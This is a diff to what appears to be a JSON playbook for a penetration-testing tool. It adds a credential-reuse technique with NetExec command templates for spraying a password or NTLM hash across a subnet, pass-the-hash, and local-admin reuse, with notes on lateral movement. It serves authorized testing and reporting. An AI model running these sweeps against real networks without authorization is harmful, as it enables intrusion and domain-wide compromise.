@@ -1907,6 +1907,7 @@
         "loot.ntds"
       ],
       "produces": [
+        "enum.deep",
         "credential.candidate"
       ],
       "priority": 74,
@@ -1960,6 +1961,56 @@
           "tool": "nxc",
           "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -x \"whoami\"",
           "note": "An execution check over WinRM, proves shell-level access without opening a full session."
+        }
+      ]
+    },
+    {
+      "id": "cred-reuse-sweep",
+      "title": "Credential-Reuse Sweep (Where Am I Admin?)",
+      "hypothesis": "One validated credential or hash is rarely good on just one host. Aim nxc at the whole subnet and it marks every box the credential opens ([+]) and every box where it is local admin (Pwn3d!). That map is the backbone of AD lateral movement: it tells you exactly where to move to next and where a dump will pay off, turning a single login into reach across the domain. Pass-the-hash sweeps the same way with -H, no plaintext needed.",
+      "tool": "nxc",
+      "tools": [
+        "nxc"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "enum.deep"
+      ],
+      "requires_any": [
+        "credential.available",
+        "hash.ntlm"
+      ],
+      "produces": [
+        "foothold.windows"
+      ],
+      "priority": 80,
+      "proves": "the set of hosts a known credential or hash opens, and which of them it owns as local admin (Pwn3d!)",
+      "does_not_prove": "admin everywhere, a [+] is a valid login and Pwn3d! is local admin on that one host; domain admin is still established on its own",
+      "report": {
+        "finding": "Credential Reuse Across Hosts",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.netexec.wiki/",
+        "https://github.com/netexec-community/nxc"
+      ],
+      "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{subnet}} -u {{user}} -p '{{password}}'",
+          "note": "PREFERRED: spray the validated credential across the whole subnet (10.10.11.0/24 or a targets file). [+] marks every host it logs into; Pwn3d! marks local admin. This is your reuse map."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{subnet}} -u {{user}} -H {{nthash}}",
+          "note": "The pass-the-hash form: sweep with just the NTLM hash, no plaintext. Ideal straight after a SAM/LSA dump to see where that hash is reused."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{subnet}} -u {{user}} -p '{{password}}' --local-auth",
+          "note": "When the credential is a LOCAL account (e.g. a dumped local Administrator hash), --local-auth validates it against each host's own SAM rather than the domain — the classic way one reused local-admin hash owns a whole fleet."
         }
       ]
     },
